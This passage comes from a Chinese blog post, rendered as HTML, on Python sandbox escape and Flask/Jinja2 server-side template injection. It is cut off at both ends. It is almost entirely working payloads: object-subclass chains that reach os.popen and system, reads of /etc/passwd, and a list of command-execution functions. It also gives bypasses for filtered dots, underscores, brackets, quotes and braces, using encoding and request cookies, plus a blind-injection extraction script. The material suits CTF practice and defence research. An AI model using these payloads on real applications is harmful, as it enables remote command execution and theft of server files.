class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="1608951891753.png" alt="1608951891753"></p><p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code>会返回 dict 类型,需要找到可以利用的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">search = [<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,]</span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].keys():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> search:</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(&#x27;file&#x27;, 114)</span></span><br><span class="line"><span class="string">(&#x27;eval&#x27;, 135)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h1 id="攻击思路扩展"><a href="#攻击思路扩展" class="headerlink" title="攻击思路扩展"></a>攻击思路扩展</h1><p><strong>命令执行方式的扩展</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os模块  py2 , py3</span></span><br><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># commands 模块 py2 </span></span><br><span class="line">commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>) </span><br><span class="line"><span class="comment"># subprocess模块 py2 , py3</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># platform模块 py2</span></span><br><span class="line">platform.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># timeit模块 py2 py3</span></span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># importlib 模块</span></span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">importlib.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># pickle模块 py2 py3</span></span><br><span class="line">pickle.loads(<span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(<span class="built_in">compile</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># bdb模块</span></span><br><span class="line">bdb.os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># cgi</span></span><br><span class="line">cgi.os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># pty</span></span><br><span class="line">pty.spawn(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>文件操作姿势扩展</strong></p><p><code>open(&#39;flag.txt&#39;).read()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">&#x27;1.txt&#x27;</span>).read()</span><br><span class="line">types.FileType(<span class="string">&#x27;1.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><code>commands.getoutput(&#39;flag&#39;)</code></p><p><strong>基类获取思路扩展</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">8</span>] <span class="comment">#针对jinjia2/flask为[9]适用</span></span><br></pre></td></tr></table></figure><p>针对Flask还可以从config等寻找可利用模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">self.__class__.__bases__ <span class="comment"># (&lt;type &#x27;object&#x27;&gt;,)</span></span><br><span class="line">get_flashed_messages.__globals__</span><br><span class="line">url_for.__globals__</span><br><span class="line">lipsum.__globals__</span><br><span class="line">x.__init__.__globals__</span><br></pre></td></tr></table></figure><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><p>下面都是我本地测试过的一些姿势(windows+Flask+python2.x)</p><p>先列出一些常见payload,根据环境不同可能还会有差别</p><blockquote><p>利用os.system执行命令返回的只有0/1 所以这里用popen</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;flag&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;os&#x27;</span>].__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;type flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">().__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;flag&#x27;</span>).readlines()</span><br><span class="line">&#123;&#123;().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">72</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;type flag&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;class&#x27;</span>]</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;sb hacker!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤 ."></a>过滤 .</h2><p> 标准的python语法使用点<code>.</code>外，还可以使用中括号<code>[]</code>来访问变量的属性 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;type flag&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤  _"></a>过滤  _</h2><p>​    用<code>request[&#39;args&#39;]</code>或者 <code>request[&#39;values&#39;]</code>或者<code>request[&#39;cookies&#39;]</code>绕过</p><blockquote><p><a href="https://blog.csdn.net/u011146423/article/details/88191225">https://blog.csdn.net/u011146423/article/details/88191225</a></p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;flag&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>[request.cookies.<span class="keyword">class</span>][request.cookies.mro][<span class="number">2</span>][request.cookies.subclasses]()[<span class="number">40</span>](<span class="string">&#x27;flag&#x27;</span>).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">cookie: subclasses=__subclasses__;class=__class__;mro=__mro__</span><br></pre></td></tr></table></figure><blockquote><p>tips 传多个cookie用;分割</p></blockquote><p>或者利用模板过滤器format</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config[<span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>) ][<span class="string">&#x27;%c%c%c%c%c%c%c%c&#x27;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">95</span>)][<span class="string">&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">103</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">98</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() </span><br></pre></td></tr></table></figure><h2 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤  []"></a>过滤  []</h2><p>用pop()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop(key[,default])</span><br><span class="line">参数</span><br><span class="line">key: 要删除的键值</span><br><span class="line">default: 如果没有 key，返回 default 值</span><br><span class="line">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br></pre></td></tr></table></figure><p>但是由于pop会删除这里面的键,不方便测试,所以不建议用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__.pop(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>别的替代:  <strong>get</strong>和<strong>setdefault</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>.get(key, default=<span class="literal">None</span>)</span><br><span class="line">返回指定键的值，如果值不在字典中返回default值</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span>.setdefault(key, default=<span class="literal">None</span>)</span><br><span class="line">和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__.setdefault(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__.get(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>用<code>__getitem__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__.__getitem__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="过滤-‘"><a href="#过滤-‘" class="headerlink" title="过滤 ‘"></a>过滤 ‘</h2><p>还是利用 <code>request.args </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[request.cookies.os].popen(request.cookies.command).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">cookie: os=os;command=whoami</span><br></pre></td></tr></table></figure><h2 id="过滤-3"><a href="#过滤-3" class="headerlink" title="过滤 "></a>过滤  {{ / }} </h2><p>还可以用  {%%} </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;%print(config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;type flag&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure><p>或者类似于盲注的一种方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;type flag&#x27;</span>).read()[<span class="number">0</span>:<span class="number">1</span>]==<span class="string">&#x27;f&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    blacklist = [<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;print&quot;</span>]</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;sb hacker!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    盲注脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 20.12.26 22:42</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line"><span class="comment"># SSTI盲注</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;?name=&#123;% if config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;type flag&#x27;).read()[0:1]==&#x27;f&#x27; %&#125;1&#123;% endif %&#125;&quot;</span></span><br><span class="line">str1 = <span class="string">&quot;?name=&#123;% if config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;type flag&#x27;).read()&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;%&#125;1&#123;% endif %&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&#x27; &#x27;</span></span><br><span class="line">i = -<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    esp = <span class="number">128</span></span><br><span class="line">    ebp = <span class="number">32</span></span><br><span class="line">    mid = <span class="number">0</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mid = <span class="built_in">int</span>((esp+ebp)/<span class="number">2</span>)</span><br><span class="line">        payload = str1 + <span class="string">f&quot;[<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>]&gt;&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span>&#x27;&quot;</span> + str2</span><br><span class="line">        res = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            ebp = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            esp = mid</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="built_in">int</span>((esp+ebp)/<span class="number">2</span>):</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h2><h3 id="过滤class"><a href="#过滤class" class="headerlink" title="过滤class"></a>过滤class</h3><p>下面两个是等价的(调用对象)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>可以利用反转字符和拼接字符</strong></p><p><code>&quot;cla&quot;+&quot;ss&quot;</code> 和<code>&quot;__ssalc__&quot;[::-1]</code>或者<code>&quot;cla&quot;&quot;ss&quot;</code></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123;config.__getattribute__(<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>).__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__getattribute__(<span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>]).__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p> <strong>ascii转换</strong> + <strong>格式化字符串</strong></p><blockquote><p>  <a href="https://xz.aliyun.com/u/21917"><strong>P3rh4ps</strong></a> 利用Python字符串格式化特性绕过ssti过滤 : <a href="https://xz.aliyun.com/t/7519">https://xz.aliyun.com/t/7519</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">97</span>)=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)=<span class="string">&#x27;__class__&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123; config[<span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p> <strong>编码绕过</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__class__&quot;</span>==<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>==<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span></span><br><span class="line"></span><br><span class="line">对于python2的话，还可以利用base64进行绕过</span><br><span class="line"><span class="string">&quot;__class__&quot;</span>==(<span class="string">&quot;X19jbGFzc19f&quot;</span>).decode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123; config[<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; config[(<span class="string">&quot;X19jbGFzc19f&quot;</span>).decode(<span class="string">&quot;base64&quot;</span>)].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p> <strong>利用chr函数</strong> </p><p> 因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;config[<span class="built_in">chr</span>(<span class="number">95</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">95</span>)].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>获取内置方法:以chr()为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[x].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span></span><br><span class="line">get_flashed_messages.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span></span><br><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span></span><br><span class="line">lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span></span><br><span 